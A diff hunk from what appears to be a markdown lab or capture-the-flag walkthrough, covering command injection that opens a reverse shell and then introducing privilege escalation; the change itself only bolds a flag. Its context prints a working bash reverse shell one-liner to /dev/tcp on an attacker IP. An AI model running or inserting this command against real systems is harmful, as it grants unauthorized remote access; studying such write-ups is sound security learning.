@@ -87,7 +87,7 @@ You need to listen on the attacking machine in order to accept the server connec
 Thanks to command injection, we can open a remote shell on our attacking machine by typing the command:
 * **bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"**
 
-In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the -c flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.
+In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the **-c** flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.
 
 ## Privilege Escalation
 At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
